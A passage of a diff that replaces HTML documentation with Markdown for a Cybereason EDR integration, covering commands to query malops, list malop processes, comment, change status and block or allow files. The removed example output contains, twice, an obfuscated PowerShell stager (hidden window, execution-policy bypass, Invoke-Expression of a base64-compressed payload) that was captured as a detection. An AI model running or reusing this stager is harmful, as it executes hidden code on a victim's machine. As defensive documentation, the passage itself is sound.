-<td style="width: 488px;">The total number of results to return for your server. To reduce system overload and maximize server performance, make sure the limit is a reasonable number.</td>
-<td style="width: 73px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 147px;">perGroupLimit</td>
-<td style="width: 488px;">The number of items to return for each malop group</td>
-<td style="width: 73px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 147px;">templateContext</td>
-<td style="width: 488px;">The level of detail to provide in the response. Possible values include:
-<ul>
-<li>SPECIFIC: References value contain only the count in the ElementValues class. The Suspicions map is calculated for each results, with the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results.</li>
-<li>CUSTOM: Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is not calculated for the results. The Evidence map is not calculated for the results.</li>
-<li>DETAILS: Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is calculated for each result, containing the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results.</li>
-</ul>
-</td>
-<td style="width: 73px;">Optional</td>
-</tr>
-<tr>
-<td style="width: 147px;">withinLastDays</td>
-<td style="width: 488px;">Return all the malops within the last days</td>
-<td style="width: 73px;">Optional</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 745px;">
-<thead>
-<tr>
-<th style="width: 255px;"><strong>Path</strong></th>
-<th style="width: 47px;"><strong>Type</strong></th>
-<th style="width: 406px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.GUID</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">Malop GUID</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.CreationTime</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">The time reported as when the malicious behavior began on the system. This is not the time the malop was first detected by Cybereason.</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.DecisionFeature</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">The reason that Cybereason raised the malop</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.Link</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">Link to the malop on Cybereason</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.Suspects</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">Malop suspect type and name</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.LastUpdatedTime</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">Last updated time of malop</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.AffectedMachine</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">List of machines affected by this malop</td>
-</tr>
-<tr>
-<td style="width: 255px;">Cybereason.Malops.InvolvedHash</td>
-<td style="width: 47px;">string</td>
-<td style="width: 406px;">List of file hashes involved in this malop</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-query-malops
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>Machine was un-isolated successfully.
+
+### cybereason-query-malops
+***
+Returns a list of all Malops and details on the Malops.
+
+
+#### Base Command
+
+`cybereason-query-malops`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| filters | Filter to filter response by, given in Cybereason API syntax. | Optional | 
+| totalResultLimit | The total number of results to return for your Server. Ensure you make the limit a reasonable number to maximize Server performance and not to overload the system. | Optional | 
+| perGroupLimit | The number of items to return per Malop group. | Optional | 
+| templateContext | The level of detail to provide in the response. Possible values include:  SPECIFIC:  References value contain only the count in the ElementValues class. The Suspicions map is calculated for each results, with the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results. CUSTOM:  Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is not calculated for the results. The Evidence map is not calculated for the results. DETAILS:  Reference values contain the specific Elements, up to the limit defined in the perFeatureLimit parameter. The Suspicions map is calculated for each result, containing the suspicion name and the first time the suspicion appeared. The Evidence map is not calculated for the results. Possible values are: MALOP, SPECIFIC, CUSTOM, DETAILS, OVERVIEW. Default is MALOP. | Optional | 
+| withinLastDays | Return all the malops within the last days. | Optional | 
+| malopGuid | Malop GUIDs to filter by (Comma separated values supported, e.g. 11.5681864988155542407,11.1773255057963879999). | Optional | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Malops.GUID | string | The unique globally unique identifier \(guid\) for the Malop. | 
+| Cybereason.Malops.CreationTime | string | The time reported as when the malicious behavior began on the system. This is not the time that the Malop was first detected by Cybereason. | 
+| Cybereason.Malops.DecisionFeature | string | The reason that Cybereason has raised the Malop. | 
+| Cybereason.Malops.Link | string | Link to the Malop on Cybereason. | 
+| Cybereason.Malops.Suspects | string | Malop suspect type and name | 
+| Cybereason.Malops.LastUpdatedTime | string | Last updated time of malop | 
+| Cybereason.Malops.AffectedMachine | string | List of machines affected by this Malop | 
+| Cybereason.Malops.InvolvedHash | string | List of file hashes involved in this Malop | 
+| Cybereason.Malops.Status | string | Malop managemant status | 
+
+#### Command example
+```!cybereason-query-malops```
+#### Context Example
+```json
+{
     "Cybereason": {
-      "Malops" : [
-        {
-            "CreationTime": "2018-04-30T14:05:14",
-            "DecisionFailure": "maliciousExecutionOfPowerShell",
-            "GUID": "11.8371241992421952627",
-            "LastUpdateTime": "2018-04-30T14:07:29",
-            "Link": "https://integration.cybereason.net:8443/#/malop/11.8371241992421952627",
-            "Suspects": "Process: powershell.exe"
-        }
-    ]
-  }
+        "Malops": [
+            {
+                "AffectedMachine": [
+                    "win10-cybereaso",
+                    "marketing"
+                ],
+                "CreationTime": "2021-07-12T09:11:42.641000",
+                "DecisionFailure": "blackListedFileHash",
+                "GUID": "11.3651150229438589171",
+                "InvolvedHash": [
+                    1
+                ],
+                "LastUpdateTime": "2021-08-28T23:19:12.430000",
+                "Link": "https://integration.cybereason.net:8443/#/malop/11.3651150229438589171",
+                "Status": "OPEN",
+                "Suspects": "Process: viagra_.exe"
+            }
+        ]
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<h3>Cybereason Malops</h3>
-<table>
-<thead>
-<tr>
-<th>GUID</th>
-<th>Link</th>
-<th>CreationTime</th>
-<th>LastUpdateTime</th>
-<th>DecisionFailure</th>
-<th>Suspects</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>11.8371241992421952627</td>
-<td><a href="https://integration.cybereason.net:8443/#/malop/11.8371241992421952627" rel="nofollow">https://integration.cybereason.net:8443/#/malop/11.8371241992421952627</a></td>
-<td>2018-04-30T14:05:14</td>
-<td>2018-04-30T14:07:29</td>
-<td>maliciousExecutionOfPowerShell</td>
-<td>Process: powershell.exe</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h3 id="h_3813627785971536082282877">7. Get a list of all malops</h3>
-<hr>
-<p>Returns a list of malops.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-malop-processes</code></p>
-<h5>Input</h5>
-<table style="width: 749px;">
-<thead>
-<tr>
-<th style="width: 140px;"><strong>Argument Name</strong></th>
-<th style="width: 493px;"><strong>Description</strong></th>
-<th style="width: 75px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 140px;">malopGuids</td>
-<td style="width: 493px;">Array of malop GUIDs (comma-separated). Retrieve the Malop GUID using the <code>cybereason-query-malops</code>.</td>
-<td style="width: 75px;">Required</td>
-</tr>
-<tr>
-<td style="width: 140px;">machinename</td>
-<td style="width: 493px;">A CSV list of machine names affected by malops, for example, <em>"machine1,machine2"</em>
-</td>
-<td style="width: 75px;">Optional</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 749px;">
-<thead>
-<tr>
-<th style="width: 269px;"><strong>Path</strong></th>
-<th style="width: 93px;"><strong>Type</strong></th>
-<th style="width: 346px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 269px;">Process.Name</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">Process name</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.Malicious</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Malicious status of the process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.CreationTime</td>
-<td style="width: 93px;">date</td>
-<td style="width: 346px;">Process creation time</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.EndTime</td>
-<td style="width: 93px;">date</td>
-<td style="width: 346px;">Process end time</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.CommandLine</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">The command line of the process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.SignedAndVerified</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Is the process signed and verified</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.ProductType</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Product type</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.Children</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Children of the process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.Parent</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Parent process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.OwnerMachine</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Machine hostname</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.User</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">The user who ran the process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.ImageFile</td>
-<td style="width: 93px;">unknown</td>
-<td style="width: 346px;">Image file of the process</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.SHA1</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">SHA-1 of the process file</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.MD5</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">MD5 of the process file</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.CompanyName</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">Company name</td>
-</tr>
-<tr>
-<td style="width: 269px;">Process.ProductName</td>
-<td style="width: 93px;">string</td>
-<td style="width: 346px;">Product name</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-malop-processes malopGuids=11.8371241992421952627
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason Malops
+>|GUID|Link|CreationTime|Status|LastUpdateTime|DecisionFailure|Suspects|AffectedMachine|InvolvedHash|
+>|---|---|---|---|---|---|---|---|---|
+>| 11.3651150229438589171 | https:<span>//</span>integration.cybereason.net:8443/#/malop/11.3651150229438589171 | 2021-07-12T09:11:42.641000 | OPEN | 2021-08-28T23:19:12.430000 | blackListedFileHash | Process: viagra_.exe | affected_machine_name | 1 |
+
+### cybereason-malop-processes
+***
+Returns a list of malops
+
+
+#### Base Command
+
+`cybereason-malop-processes`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuids | Array of malop GUIDs separated by comma. (Malop GUID can be retrieved with the command cybereason-query-malops command). | Required | 
+| machineName | Machine names which were affected by malop. Comma separated values supported (e.g., machine1,machine2). | Optional | 
+| dateTime | Starting Date and Time to filter the Processes based on their creation date. The format for the input is ("YYYY/MM/DD HH:MM:SS"). | Optional | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Process.Name | string | The process name | 
+| Cybereason.Process.Malicious | Unknown | Malicious status of the process | 
+| Cybereason.Process.CreationTime | date | The process creation time | 
+| Cybereason.Process.EndTime | date | The process end time | 
+| Cybereason.Process.CommandLine | string | The command line of the process | 
+| Cybereason.Process.SignedAndVerified | Unknown | Is the process signed and verified | 
+| Cybereason.Process.ProductType | Unknown | The product type | 
+| Cybereason.Process.Children | Unknown | Children of the process | 
+| Cybereason.Process.Parent | Unknown | The parent process | 
+| Cybereason.Process.OwnerMachine | Unknown | The machine's hostname | 
+| Cybereason.Process.User | string | The user who ran the process | 
+| Cybereason.Process.ImageFile | Unknown | Image file of the process | 
+| Cybereason.Process.SHA1 | string | SHA1 of the process file | 
+| Cybereason.Process.MD5 | string | MD5 of the process file | 
+| Cybereason.Process.CompanyName | string | The company's name | 
+| Cybereason.Process.ProductName | string | The product's name | 
+
+#### Command example
+```!cybereason-malop-processes malopGuids=<malop_id>```
+#### Context Example
+```json
+{
     "Process": [
         {
-            "CommandLine": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('nVRtc9o4EP7Or9jx6GbsCVbMS2mCJzOl0LTcFZoLtOkdw9wIW2AXWXJkGUwo//3W4CP0632xvNLuPs+unhV5hjt4Z9VmAyGGSaq0sa0115KLVpOGQljOHNJ8IeIAMsMMLrwweA5DaR6Mhm+xNjkTPSFUYFd7Iu2FoeZZVoc8lgbC7SR+4ZWxPPliKiWnu/R1+0ErwwPj+P+bS19zZvg0wiV85XKye8boeJEbfkHKsGB9YnZ2xj1tzuzP2w9Ms4Qj1jn4iIUl3Au2uvQ8oQ1DLMN6VzN6tychdtjqve8PPtx//DT8/Y/Po/GXhz8fJ9Ov356+//U3WwQhX66i+MdaJFKlzzoz+WZb7F68RrPVftN5e3Nr0anqR0z3tGY726ktcxmU6BDYZOPsQXOTYx9se4bsZvM5kM2vEfATRpxluebul8UPbDO4kzxxKH7gN/CKhueBy5/htukcXrMb2JNlyd7yG5S2fi4VFhdErjqmwLOrOyDhzF5x42omQ5WAm7AiTjArCelnLlcmcuYHv+JHlv5Fdg57SLUKsNWwn7GS6JwUCIefKyD/HHzgMkQKBbLPUA0VLuxtybf/GY9HXIdK1ILtHA4XAKs9IGOwSXzn+SQGVxjotPHv6srZkwiRjE/WJWCICNwHqArEEAEx8l2jX1Y6RCUj4UO8BBt7njkOnLuOHghbGdbt5vtXC8skCcaNkWfV78kuMzyhY27oE1/0Rcwloif0E8qF64yi6Gwrz7h22QqPrDpYI/USC8Gu29RDVJWkqLiFQJ6jyfADdGjDh6cYq99mMJ46llMjEjFXPsze7ww/yiAtySd0oLZSKBYOmGG2FRmTdq+vG7dN2ujcUI82vJtuu926JtICzKIwCOm45XjihfJkwfWAL2MZH9tKnsEd4ziAheitpgWuRCtLWcDhuHNfXUAGbsqyzEQ6r5Hijqhu95fnwquTtBJJ3Stanufh0vYcf1Y16zGXJk44xeniWqUTrjcxyoWOmM4iJubdbl+lO5ukdfDqMDsN4dwmBYofjVbTdpw6nEHK0jDk8pVAxDop6uXilUOicuPKXOBNH18CdyI4T3FWeKBQijedtucd8O0Kov3hXw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"",
-            "CompanyName": "Microsoft Corporation",
-            "CreationTime": "2018-04-30T14:05:49",
-            "EndTime": "2018-04-30T14:06:22",
-            "ImageFile": "powershell.exe",
-            "MD5": "92f44e405db16ac55d97e3bfe3b132fa",
+            "Children": null,
+            "CommandLine": "\"C:\\Users\\prase\\Downloads\\winrar-x64-602.pdf.exe\"",
+            "CompanyName": "Alexander Roshal",
+            "CreationTime": "2022-03-14T13:25:56.309000",
+            "EndTime": "2022-03-14T13:26:01.712000",
+            "ImageFile": "<image_file_name>",
+            "MD5": "fc61fdcad5a9d52a01bd2d596f2c92b9",
             "Malicious": "indifferent",
-            "Name": "powershell.exe",
-            "OwnerMachine": "ROBERTE-EXCASST",
-            "Parent": "excel.exe",
-            "ProductName": "Microsoft® Windows® Operating System",
-            "SHA1": "04c5d2b4da9a0f3fa8a45702d4256cee42d8c48d",
-            "User": "darkcap\\roberte"
+            "Name": "<file_name>",
+            "OwnerMachine": "desktop-vg9ke2u",
+            "Parent": "explorer.exe",
+            "ProductName": "WinRAR",
+            "ProductType": null,
+            "SHA1": "77ab1e20c685e716b82c7c90b373316fc84cde23",
+            "SignedandVerified": null,
+            "User": "desktop-vg9ke2u\\prase"
         }
     ]
 }
-</pre>
-<h5>Human Readable Output</h5>
-<h3>Cybereason Malop Processes</h3>
-<table>
-<thead>
-<tr>
-<th>Name</th>
-<th>Malicious</th>
-<th>Creation Time</th>
-<th>End Time</th>
-<th>Command Line</th>
-<th>Parent</th>
-<th>Owner Machine</th>
-<th>User</th>
-<th>Image File</th>
-<th>SHA1</th>
-<th>MD5</th>
-<th>Company Name</th>
-<th>Product Name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>powershell.exe</td>
-<td>indifferent</td>
-<td>2018-04-30T14:05:49</td>
-<td>2018-04-30T14:06:22</td>
-<td>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('nVRtc9o4EP7Or9jx6GbsCVbMS2mCJzOl0LTcFZoLtOkdw9wIW2AXWXJkGUwo//3W4CP0632xvNLuPs+unhV5hjt4Z9VmAyGGSaq0sa0115KLVpOGQljOHNJ8IeIAMsMMLrwweA5DaR6Mhm+xNjkTPSFUYFd7Iu2FoeZZVoc8lgbC7SR+4ZWxPPliKiWnu/R1+0ErwwPj+P+bS19zZvg0wiV85XKye8boeJEbfkHKsGB9YnZ2xj1tzuzP2w9Ms4Qj1jn4iIUl3Au2uvQ8oQ1DLMN6VzN6tychdtjqve8PPtx//DT8/Y/Po/GXhz8fJ9Ov356+//U3WwQhX66i+MdaJFKlzzoz+WZb7F68RrPVftN5e3Nr0anqR0z3tGY726ktcxmU6BDYZOPsQXOTYx9se4bsZvM5kM2vEfATRpxluebul8UPbDO4kzxxKH7gN/CKhueBy5/htukcXrMb2JNlyd7yG5S2fi4VFhdErjqmwLOrOyDhzF5x42omQ5WAm7AiTjArCelnLlcmcuYHv+JHlv5Fdg57SLUKsNWwn7GS6JwUCIefKyD/HHzgMkQKBbLPUA0VLuxtybf/GY9HXIdK1ILtHA4XAKs9IGOwSXzn+SQGVxjotPHv6srZkwiRjE/WJWCICNwHqArEEAEx8l2jX1Y6RCUj4UO8BBt7njkOnLuOHghbGdbt5vtXC8skCcaNkWfV78kuMzyhY27oE1/0Rcwloif0E8qF64yi6Gwrz7h22QqPrDpYI/USC8Gu29RDVJWkqLiFQJ6jyfADdGjDh6cYq99mMJ46llMjEjFXPsze7ww/yiAtySd0oLZSKBYOmGG2FRmTdq+vG7dN2ujcUI82vJtuu926JtICzKIwCOm45XjihfJkwfWAL2MZH9tKnsEd4ziAheitpgWuRCtLWcDhuHNfXUAGbsqyzEQ6r5Hijqhu95fnwquTtBJJ3Stanufh0vYcf1Y16zGXJk44xeniWqUTrjcxyoWOmM4iJubdbl+lO5ukdfDqMDsN4dwmBYofjVbTdpw6nEHK0jDk8pVAxDop6uXilUOicuPKXOBNH18CdyI4T3FWeKBQijedtucd8O0Kov3hXw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"</td>
-<td>excel.exe</td>
-<td>ROBERTE-EXCASST</td>
-<td>darkcap\roberte</td>
-<td>powershell.exe</td>
-<td>04c5d2b4da9a0f3fa8a45702d4256cee42d8c48d</td>
-<td>92f44e405db16ac55d97e3bfe3b132fa</td>
-<td>Microsoft Corporation</td>
-<td>Microsoft® Windows® Operating System</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h3 id="h_7892645756931536082294067">8. Add a comment to a malop</h3>
-<hr>
-<p>Adds a new comment to a malop.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-add-comment</code></p>
-<h5>Input</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 135px;"><strong>Argument Name</strong></th>
-<th style="width: 499px;"><strong>Description</strong></th>
-<th style="width: 74px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 135px;">comment</td>
-<td style="width: 499px;">Comment to add to the malop.</td>
-<td style="width: 74px;">Required</td>
-</tr>
-<tr>
-<td style="width: 135px;">malopGuid</td>
-<td style="width: 499px;">GUID of the malop to add the comment to. Retrieve the Malop GUID using the <code>cybereason-query-malops</code>.</td>
-<td style="width: 74px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<p>There is no context output for this command.</p>
-<h5>Command Example</h5>
-<pre>!cybereason-add-comment comment=NewComment malopGuid=11.8371241992421952627
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>Comment added successfully</code></p>
-<h3 id="h_7664320367841536082302674">9. Update malop status</h3>
-<hr>
-<p>Updates a malop status.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-update-malop-status</code></p>
-<h5>Input</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 180px;"><strong>Argument Name</strong></th>
-<th style="width: 417px;"><strong>Description</strong></th>
-<th style="width: 111px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 180px;">malopGuid</td>
-<td style="width: 417px;">GUID of the malop to update the status of</td>
-<td style="width: 111px;">Required</td>
-</tr>
-<tr>
-<td style="width: 180px;">status</td>
-<td style="width: 417px;">Status to update</td>
-<td style="width: 111px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 333px;"><strong>Path</strong></th>
-<th style="width: 95px;"><strong>Type</strong></th>
-<th style="width: 280px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 333px;">Cybereason.Malops.GUID</td>
-<td style="width: 95px;">string</td>
-<td style="width: 280px;">Malop GUID</td>
-</tr>
-<tr>
-<td style="width: 333px;">Cybereason.Malops.Status</td>
-<td style="width: 95px;">string</td>
-<td style="width: 280px;">
-<p>Malop status:</p>
-<ul>
-<li>To Review</li>
-<li>Unread</li>
-<li>Remediated</li>
-<li>Not Relevant</li>
-</ul>
-</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-update-malop-status malopGuid=11.8371241992421952627 status="To Review"
-</pre>
-<h5>Context Example</h5>
-<pre>{
+```
+
+#### Human Readable Output
+
+>### Cybereason Malop Processes
+>|Name|Malicious|Creation Time|End Time|Command Line|Parent|Owner Machine|User|Image File|SHA1|MD5|Company Name|Product Name|
+>|---|---|---|---|---|---|---|---|---|---|---|---|---|
+>| winrar-x64-602.pdf.exe | indifferent | 2022-03-14T13:25:56.309000 | 2022-03-14T13:26:01.712000 | "C:\Users\prase\Downloads\winrar-x64-602.pdf.exe" | explorer.exe | desktop-vg9ke2u | desktop-vg9ke2u\prase | winrar-x64-602.pdf.exe | 77ab1e20c685e716b82c7c90b373316fc84cde23 | fc61fdcad5a9d52a01bd2d596f2c92b9 | Alexander Roshal | WinRAR |
+
+### cybereason-add-comment
+***
+Add new comment to malop
+
+
+#### Base Command
+
+`cybereason-add-comment`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| comment | Comment to add to the malop. | Required | 
+| malopGuid | Malop GUID to add comment to. (Malop GUID can be retrieved with the command cybereason-query-malops command). | Required | 
+
+
+#### Context Output
+
+There is no context output for this command.
+#### Command example
+```!cybereason-add-comment comment=NewComment malopGuid=<malop_id>```
+#### Human Readable Output
+
+>Comment added successfully
+
+### cybereason-update-malop-status
+***
+Updates malop status
+
+
+#### Base Command
+
+`cybereason-update-malop-status`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| malopGuid | Malop GUID to update its status. | Required | 
+| status | Status to update. Possible values are: To Review, Unread, Remediated, Not Relevant, Open. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Malops.GUID | string | Malop GUID | 
+| Cybereason.Malops.Status | string | Malop status: To Review,Unread,Remediated,Not Relevant | 
+
+#### Command example
+```!cybereason-update-malop-status malopGuid=<malop_id> status="To Review"```
+#### Context Example
+```json
+{
     "Cybereason": {
-      "Malops":
-        "GUID": "11.8371241992421952627",
-        "Status": "To Review"
-       }
+        "Malops": {
+            "GUID": "11.-7780537507363356527",
+            "Status": "To Review"
+        }
     }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>Successfully updated malop 11.8371241992421952627 to status To Review</code></p>
-<h3 id="h_550371171841544433914048">10. Prevent a malop process file </h3>
-<hr>
-<p>Prevent malop process file from running on the machine.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-prevent-file</code></p>
-<h5>Input</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 201px;"><strong>Argument Name</strong></th>
-<th style="width: 381px;"><strong>Description</strong></th>
-<th style="width: 126px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 201px;">hash</td>
-<td style="width: 381px;">MD5 of the malop process file to prevent</td>
-<td style="width: 126px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 163px;"><strong>Path</strong></th>
-<th style="width: 91px;"><strong>Type</strong></th>
-<th style="width: 453px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 163px;">Process.MD5</td>
-<td style="width: 91px;">string</td>
-<td style="width: 453px;">Process file MD5</td>
-</tr>
-<tr>
-<td style="width: 163px;">Process.Prevent</td>
-<td style="width: 91px;">boolean</td>
-<td style="width: 453px;">True if process file is prevented</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-prevent-file hash=6fb065fcff8d92da51bba667dc9f770c
-</pre>
-<h5>Context Example</h5>
-<pre>{
-  "Process": {
-    "MD5": "6fb065fcff8d92da51bba667dc9f770c",
-    "Prevent": true
-  }
+```
+
+#### Human Readable Output
+
+>Successfully updated malop 11.-7780537507363356527 to status To Review
+
+### cybereason-prevent-file
+***
+Prevent malop process file
+
+
+#### Base Command
+
+`cybereason-prevent-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| md5 | Malop process file MD5 to prevent. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Process.MD5 | string | Process file MD5 | 
+| Cybereason.Process.Prevent | boolean | True if process file is prevented, else false | 
+
+#### Command example
+```!cybereason-prevent-file md5=fc61fdcad5a9d52a01bd2d596f2c92b9```
+#### Context Example
+```json
+{
+    "Process": {
+        "MD5": "fc61fdcad5a9d52a01bd2d596f2c92b9",
+        "Prevent": true
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>File was prevented successfully.</code></p>
-<h3 id="h_3189997752931544433919989">11. Allow a malop process file</h3>
-<hr>
-<p>Allow a malop process file to run on the machine.</p>
-<h5>Base Command</h5>
-<p><code>cybereason-unprevent-file</code></p>
-<h5>Input</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 176px;"><strong>Argument Name</strong></th>
-<th style="width: 423px;"><strong>Description</strong></th>
-<th style="width: 108px;"><strong>Required</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 176px;">hash</td>
-<td style="width: 423px;">MD5 of the malop process file to allow</td>
-<td style="width: 108px;">Required</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Context Output</h5>
-<table style="width: 750px;">
-<thead>
-<tr>
-<th style="width: 201px;"><strong>Path</strong></th>
-<th style="width: 106px;"><strong>Type</strong></th>
-<th style="width: 401px;"><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="width: 201px;">Process.MD5</td>
-<td style="width: 106px;">string</td>
-<td style="width: 401px;">Process file MD5</td>
-</tr>
-<tr>
-<td style="width: 201px;">Process.Prevent</td>
-<td style="width: 106px;">boolean</td>
-<td style="width: 401px;">True if process file is prevented</td>
-</tr>
-</tbody>
-</table>
-<p> </p>
-<h5>Command Example</h5>
-<pre>!cybereason-unprevent-file hash=6fb065fcff8d92da51bba667dc9f770c
-</pre>
-<h5>Context Example</h5>
-<pre>{
-  "Process": {
-    "MD5": "6fb065fcff8d92da51bba667dc9f770c",
-    "Prevent": false
-  }
+```
+
+#### Human Readable Output
+
+>File was prevented successfully
+
+### cybereason-unprevent-file
+***
+Unprevent malop process file
+
+
+#### Base Command
+
+`cybereason-unprevent-file`
+#### Input
+
+| **Argument Name** | **Description** | **Required** |
+| --- | --- | --- |
+| md5 | Malop process file MD5 to unprevent. | Required | 
+
+
+#### Context Output
+
+| **Path** | **Type** | **Description** |
+| --- | --- | --- |
+| Cybereason.Process.MD5 | string | Process file MD5 | 
+| Cybereason.Process.Prevent | boolean | True if process file is prevented, else false | 
+
+#### Command example
+```!cybereason-unprevent-file md5=fc61fdcad5a9d52a01bd2d596f2c92b9```
+#### Context Example
+```json
+{
+    "Process": {
+        "MD5": "fc61fdcad5a9d52a01bd2d596f2c92b9",
+        "Prevent": false
+    }
 }
-</pre>
-<h5>Human Readable Output</h5>
-<p><code>File was unprevented successfully.</code></p>
-<h3 id="h_163523643981546507570294">12. Get information for a file</h3>
-<hr>
-<p>Query files as part of investigation.</p>
